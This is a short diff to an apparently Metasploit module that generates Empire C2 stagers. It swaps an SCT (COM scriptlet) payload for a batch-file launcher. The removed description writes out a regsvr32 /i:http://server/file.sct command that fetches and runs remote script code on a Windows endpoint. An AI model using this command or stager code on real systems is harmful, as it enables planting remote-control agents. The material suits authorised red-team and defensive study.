@@ -10,12 +10,12 @@ module MetasploitModule
 
   def initialize(info={})
     super(merge_info(info,
-                     'Description'=> 'Creates a SCT (COM Scriptlet) Payload for Empire, on the endpoint simply launch regsvr32 /u /n /s /i:http:http://server/file.sct scrobj.dll'
+    'Description'=> 'Creates a Batch File Payload for Empire'
     ))
   end
 
-  def stager_generator(empireClient)
-    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_sct')
+  def stagerGenerator(empireClient)
+    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_bat')
     return @stagerCode
   end
 end
